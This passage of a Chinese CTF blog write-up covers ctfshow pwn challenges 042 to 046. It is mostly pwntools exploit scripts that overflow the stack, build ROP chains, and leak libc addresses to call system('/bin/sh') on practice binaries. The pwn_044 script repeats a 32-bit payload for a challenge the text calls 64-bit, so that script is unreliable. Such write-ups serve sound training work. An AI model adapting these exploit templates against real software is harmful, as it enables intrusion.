class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">sh_addr = <span class="number">0x080487BA</span>  </span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">pop_edi_addr = <span class="number">0x0804878a</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x12</span> + <span class="number">0x04</span>) + p32(system) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x04</span> + p32(sh_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/82aad526-5589-497a-81cb-671ac775896c.png" alt="alt text"></p><h2 id="pwn-042">pwn_042</h2><p><em>64位的 system(); 但是没&quot;/bin/sh&quot; ，好像有其他的可以替代</em></p><p>checksec查保护信息，得到64位程序，只开启NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3d0c3631-b2e6-4dd2-8b71-f0064a30fd4b.png" alt="alt text"><br>使用ida反编译审计<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3dbf30dc-39d0-4490-a5b9-2be70adbb3fa.png" alt="alt text"><br>与上题类似，只不过是64位程序。存在system函数以及<code>sh</code>字符，偏移为<code>0x0a</code>。<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">sh_addr = <span class="number">0x0400872</span>  </span><br><span class="line">pop_rdi_ret = <span class="number">0x0400843</span>  </span><br><span class="line">ret = <span class="number">0x040053e</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x0a</span> + <span class="number">0x08</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(ret) + p64(system_plt)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7b302818-0f10-442c-84aa-30a136c2f6fa.png" alt="alt text"></p><h2 id="pwn-043">pwn_043</h2><p><em>32位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法</em></p><p>check查保护信息，32位程序，仅开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/70a285cd-e4aa-45ce-becf-a556d67880e1.png" alt="alt text"><br>拖入IDA中查看<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d386c7f2-466b-4e25-870f-ddca50c88f6f.png" alt="alt text"><br>gets函数栈溢出，并且程序中不存在<code>/bin/sh</code>，我们想到利用<code>gets()</code>向<code>.bss</code>段中写入<code>/bin/sh</code>，然后构造<code>system('/bin/sh')</code>拿到shell。<br>首先计算偏移为<code>0x6c</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/bfa0c2bd-4f67-4371-b3b8-60f55db07b6b.png" alt="alt text"><br>寻找到可以写入的<code>.bss</code>段地址<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/9e97beaf-fe8e-44ae-81d3-782851c8ac5b.png" alt="alt text"><br>通过gdb调试可以确定该<code>.bss</code>段可写入<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6ca62753-037e-43fa-ae0f-77f955ec567a.png" alt="alt text"><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]  </span><br><span class="line">bss_addr = <span class="number">0x0804B060</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">0x04</span>) + p32(gets_plt) + p32(system_plt) + p32(bss_addr) * <span class="number">2</span>  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>本地打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/77033cd9-051a-4c7e-9315-42c21f54359c.png" alt="alt text"></p><h2 id="pwn-044">pwn_044</h2><p><em>64位的 system(); 但是好像没&quot;/bin/sh&quot; 上面的办法不行了，想想办法</em></p><p>checksec查保护信息，64位程序，仅开启NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/57465229-38af-49db-9b77-001f8d780b95.png" alt="alt text"><br>拖入ida中查看<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/80e8c7bc-a3e1-4ba2-9c49-19ee6b99f448.png" alt="alt text"><br>与上题一样，gets栈溢出，且无<code>/bin/sh</code>。<br>计算偏移为<code>0x0a</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/88a152db-086d-4a91-97d1-a7cd0e6961a2.png" alt="alt text"><br>寻找能写入的<code>.bss</code>段地址<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/76139d95-0b69-4a24-8dda-599d89f06b26.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/86b53484-03f7-41f6-b272-204c66e42bd4.png" alt="alt text"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">sh_addr = <span class="number">0x080487BA</span>  </span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">pop_edi_addr = <span class="number">0x0804878a</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x12</span> + <span class="number">0x04</span>) + p32(system) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x04</span> + p32(sh_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/28c3b29a-407a-4612-9579-c59482113864.png" alt="alt text"></p><h2 id="pwn-045">pwn_045</h2><p><em>32位 无 system 无 “/bin/sh”</em></p><p>checksec查信息，32位程序，仅开启NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/45b404b8-4417-43da-b0f4-df6bdb49fb2c.png" alt="alt text"><br>拖入IDA中反编译查看<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/519137ce-5023-468f-937b-082d5ebc7085.png" alt="alt text"><br>存在read栈溢出，无<code>system()</code>与<code>/bin/sh</code>，想到使用<code>write()</code>函数泄露libc地址，libc中存在可以构造成<code>system('/bin/sh')</code>的gadget。<br>计算偏移<code>0x6B</code><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a064c846-cbbe-41cf-9f62-47a02de5b38d.png" alt="alt text"><br><a href="https://blog.csdn.net/qq_73089613/article/details/147365451?spm=1011.2415.3001.5331">pwn中wire函数的用处</a><br>这里我们使用<code>write()</code>函数泄露<code>puts</code>函数的地址，然后获得<code>libc</code>基地址，最后根据基地址找到<code>system()</code>函数，构造ROP链。<br>还有一个问题是，题目程序有的使用<code>libc</code>程序版本不同，相应的函数地址也有不同，这就需要我们确定libc的版本，然后再计算基地址，计算函数地址，之后才能构造ROP链子。</p><p>如何获得<code>libc</code>的版本号，有以下方法，</p><ul><li>我们可以使用<a href="https://github.com/lieanu/LibcSearcher">LibcSeacher</a>泄露libc的版本，进而泄露更多信息。</li><li>或者可以先泄露某个函数的地址，利用<a href="https://libc.blukat.me/">在线网站</a>查找到libc版本，下载下来，再进行做题。</li><li>有的题目会给使用的libc版本，可以使用<code>strings + file</code>命令进行查看版本号，然后使用<code>glibc-all-in-one</code>下载做题。</li></ul><p>本题并没有给到<code>libc</code>附件，所以我们首先使用手动泄露的方式，然后再使用<code>LibcSearcher</code>。</p><p><strong>手工</strong></p><p>首先，编写程序将<code>puts</code>函数的地址泄露<br>构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>, <span class="built_in">puts</span>@got, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>不太清楚为什么，尝试泄露<code>puts</code>,<code>write</code>函数的地址没有泄露成功，全部卡住不动，但是成功泄露出了<code>libc_start_main_got</code>的地址。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7f19e2e1-84e0-4921-b747-53341574c2b4.png" alt="alt text"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x6B</span> + <span class="number">0x04</span>) +  p32(write_plt)  + p32(ctfshow) + p32(<span class="number">1</span>) + p32(puts_got) + p32(<span class="number">4</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">gdb.attach(sh)  </span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><p>刚刚那会儿死活泄露不出来，这会儿来一个泄露一个，风水问题？😡<br>将泄露出得<code>puts</code>、<code>write</code>，<code>__libc_start_main</code>的地址后三位复制到查询libc的网站中，<a href="https://libc.blukat.me/">libc database search</a>,添加的信息越多，越能确定对方服务器使用的libc版本：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e421ab40-b449-4a0a-9c64-d6f53fad9be2.png" alt="alt text"><br>接下来，使用<code>glibc-all-in-one</code>将这四个版本下载到本地，挨个试一试。构造exp，拿到shell。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/aad0c62d-b209-49ab-ae5a-f3ad3e3a78c6.png" alt="alt text"><br>像这样，将libc下载下来使用。使用下面语法进行连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./2.35-0ubuntu3.9_i386/libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure><p>接下来计算libc基地址，因为所有函数的真实地址都需要通过基地址来计算。<br>基地址已泄露函数地址中函数的地址libc基地址=已泄露函数地址−libc中函数的地址</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&quot;./2.35-0ubuntu3.9_i386/libc.so.6&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x6B</span> + <span class="number">0x04</span>) +  p32(write_plt)  + p32(ctfshow) + p32(<span class="number">1</span>) + p32(puts_got) + p32(<span class="number">4</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line"><span class="comment"># gdb.attach(sh)  </span></span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  </span><br><span class="line">  </span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">bin_sh = libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__() + libc_base  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x6B</span> + <span class="number">0x04</span>) + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x04</span> + p32(bin_sh)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>本地打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/bbbec662-3919-4d59-a377-10824509500e.png" alt="alt text"></p><p><strong>Libcsearcher</strong>:</p><p>没利用成功，本地libc数据库没有找到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x6B</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(libc_start_main_got) + p32(<span class="number">4</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, puts_addr, <span class="number">0</span>)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x6B</span> + <span class="number">0x04</span>) + p32(system_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x04</span> + p32(bin_sh)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>在虚拟机上跑成功了，应该是docker环境设置的问题。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/9dc6f6ad-bee9-42b7-8ac3-7417d8416246.png" alt="alt text"></p><h2 id="pwn-046">pwn_046</h2><p>64位 无 system 无 “/bin/sh”</p><p>与上题一样，不一样的是64位程序。checksec查保护，仅开启NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d8f22c70-4ff8-4e15-bf8a-30a74bf126ca.png" alt="alt text"><br>使用ida反编译查看。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d65ac114-f111-4120-983e-ffb28b122394.png" alt="alt text"><br>read栈溢出，同样没有<code>system</code>函数以及<code>/bin/sh</code><br>计算偏移<code>0x70</code>：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/59cfbb42-49d4-458d-851c-6014a7fc8e88.png" alt="alt text"><br>首先泄露<code>puts</code>、<code>write</code>、<code>__libc_start_mian</code>函数的地址，然后计算基址，最后拿到libc中<code>system</code>函数与<code>/bin/sh</code>，构造ROP链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x0400803</span>  </span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0400801</span>  </span><br><span class="line">ret = <span class="number">0x04004fe</span>  </span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  </span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * (0x70 + 0x08) + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15_ret ) + p64(puts_got) * 2 + p64(write_plt) + p64(ctfshow)  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x08</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ctfshow)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))  </span><br><span class="line">  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x08</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>很奇怪，使用<code>write</code>泄露的libc不能使用，使用<code>puts</code>泄露可以，不知道什么情况，有没有大佬可以解惑。🤔<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b58aa162-27dd-40c3-81d4-f00fc438d998.png" alt="alt text"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span 